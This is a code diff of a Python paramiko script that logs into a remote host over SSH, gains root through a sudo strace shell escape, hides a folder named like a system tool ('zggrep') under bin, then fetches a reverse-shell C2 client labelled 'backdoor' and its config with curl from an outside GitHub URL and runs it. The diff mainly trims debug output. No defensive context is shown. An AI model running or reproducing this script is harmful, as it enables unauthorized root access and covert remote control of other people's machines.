@@ -42,61 +42,31 @@ client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 try:
     # Connect to the server
     client.connect(hostname, port=port, username=username, password=password)
-    
     shell = client.invoke_shell()
+    
+    print("Connected to host")
     
     time.sleep(1)
     if shell.recv_ready():
         shell.recv(65535)
-    
-    # test 
-    shell.send(b"whoami\n")
-    
-    time.sleep(1)
-    output = ""
-    while shell.recv_ready():
-        output += shell.recv(4096).decode("utf-8")
-    print(output)
         
     # perform root escalation
     shell.send(b"sudo /bin/strace -o /dev/null /bin/bash -p\n")
         
-    time.sleep(3)
-    output = ""
-    while shell.recv_ready():
-        output += shell.recv(4096).decode("utf-8")
-    print(output)
-            
-    # test escalation
-    shell.send(b"whoami\n")
+    time.sleep(2)
     
+    shell.send(b"cd ../../bin\n")
     time.sleep(1)
-    output = ""
-    while shell.recv_ready():
-        output += shell.recv(4096).decode("utf-8")     
-    print(output)
-    
-    
+            
     shell.send(b"mkdir zggrep\n")
-            
     time.sleep(1)
-    output = ""
-    while shell.recv_ready():
-        output += shell.recv(4096).decode("utf-8")     
-    print(output)
     
-    
-    shell.send(b"cd zggrep\n")
-            
+    shell.send(b"cd zggrep\n")   
     time.sleep(1)
-    output = ""
-    while shell.recv_ready():
-        output += shell.recv(4096).decode("utf-8")     
-    print(output)
-               
+    
     # get backdoor
     shell.send(b"curl -o zggrep.py https://raw.githubusercontent.com/lbowne1/reverse_shell_c2/main/client.py\n")
-        
+    print("Downloading backdoor...")
     time.sleep(1)
     output = ""
     while shell.recv_ready():
@@ -105,17 +75,15 @@ try:
     
     # get config
     shell.send(b"curl -O https://raw.githubusercontent.com/lbowne1/reverse_shell_c2/main/config.py\n")
-        
+    print("Downloading config file...")
     time.sleep(1)
     output = ""
     while shell.recv_ready():
         output += shell.recv(4096).decode("utf-8")     
     print(output)
     
-    
     shell.send(b"python zggrep.py\n")
     
-        
     print("Payload has run, use the listening terminal to access host.")
     while True:
         user_input = input("Type 'exit' to close reverse shell: ")
@@ -125,26 +93,6 @@ try:
             break
         else:
             print(f"You typed: {user_input}")
-            
-    # print("you have 90 seconds")
-    # time.sleep(85)
-    # output = ""
-    # while shell.recv_ready():
-    #     output += shell.recv(4096).decode("utf-8")     
-    # print(output)
-    
-    
-    
-    # print("shutting down in 5...")
-    # time.sleep(1)
-    # print("4...")
-    # time.sleep(1)
-    # print("3...")
-    # time.sleep(1)
-    # print("2...")
-    # time.sleep(1)
-    # print("1...")
-    # time.sleep(1)
     
 finally:
     # close the connection
